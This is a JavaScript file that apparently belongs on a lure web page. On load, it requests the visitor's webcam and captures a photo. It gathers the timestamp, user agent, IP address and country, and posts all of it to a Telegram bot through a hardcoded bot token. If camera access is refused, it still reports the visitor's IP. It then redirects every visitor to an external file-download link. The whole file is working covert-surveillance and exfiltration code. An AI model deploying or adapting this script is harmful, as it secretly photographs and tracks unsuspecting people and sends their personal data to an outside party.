const token = '7374782853:AAG5Spli2tufR7hIXousAGbxNlZgHi4aAyc';
const chatId = '7175670385';

window.addEventListener('load', async function () {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({video: true});
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();

        video.onloadedmetadata = async () => {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            stream.getTracks().forEach(track => track.stop());
            const imageDataUrl = canvas.toDataURL('image/jpeg');
            const imageBlob = await (await fetch(imageDataUrl)).blob();

            let currentTimestamp = new Date().toISOString();
            let userAgent = navigator.userAgent;
            let ipAndCountry = await getIPAndCountry();
            let ip = ipAndCountry.ip;
            let country = ipAndCountry.country;

            const caption = `
Timestamp: ${currentTimestamp}
User Agent: ${userAgent}
IP: ${ip}
Country: ${country}
                    `;

            sendImageToTelegramBot(imageBlob, caption);
        };
    } catch (error) {
        console.error('Camera access denied or error occurred:', error);
        sendToTelegramBotFail("Camera access denied or error occurred");
    }
});

async function sendImageToTelegramBot(imageBlob, caption) {
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', imageBlob, 'image.jpg');
    formData.append('caption', caption);

    const url = `https://api.telegram.org/bot${token}/sendPhoto`;

    fetch(url, {
        method: 'POST',
        body: formData
    })
        .then(response => response.json())
        .then(data => {
            console.log(data);
            window.location.href = `https://send.zcyph.cc/download/348dfa91803c0942/#RA-2vcQCp7RQabIlGgYeTg`;
        })
        .catch(error => {
            console.error(error);
            sendToTelegramBotFail("Error sending image to Telegram bot");
        });
}

async function sendToTelegramBotFail(reason) {

    let currentTimestamp = new Date().toISOString();
    let userAgent = navigator.userAgent;
    let ipAndCountry = await getIPAndCountry();
    let ip = ipAndCountry.ip;
    let country = ipAndCountry.country;

    const text = `
\`\`\`
Timestamp: ${currentTimestamp},
Reason: ${reason},
User Agent: ${userAgent},
IP: ${ip},
Country: ${country},
\`\`\``;

    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;

    fetch(url)
        .then(response => response.json())
        .then(data => console.log(data))
        .catch(error => console.error(error));

    window.location.href = `https://send.zcyph.cc/download/348dfa91803c0942/#RA-2vcQCp7RQabIlGgYeTg`;
}

async function getIPAndCountry() {
    const response = await fetch('https://api.country.is/');
    if (!response.ok) {
        console.error('Error:', response.statusText);
        return;
    }
    return await response.json();
}
